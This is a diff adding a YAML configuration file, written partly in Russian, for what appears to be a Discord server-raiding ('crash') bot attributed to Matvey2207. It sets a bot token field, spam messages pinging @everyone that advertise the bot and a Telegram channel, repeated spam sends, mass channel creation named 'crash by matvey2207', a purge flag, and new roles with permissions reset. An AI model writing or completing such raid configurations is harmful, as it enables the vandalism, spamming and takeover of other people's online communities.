@@ -1,0 +1,19 @@
+token: token_bota
+status:
+    type: competing
+    text: недрочабрь
+spam-text: |
+    @everyone
+    Сервер крашится самым быстрым ботом от Matvey2207
+    Telegram: https://t.me/anticrash_logs
+spam-count: 5
+channels:
+    name: crash by matvey2207
+    topic: |
+        Сервер крашится самым быстрым ботом от Matvey2207
+        Telegram: https://t.me/anticrash_logs
+    lm-purge: true
+roles:
+    name: Crash by Matvey2207
+    color: random
+    reset-permissions: true
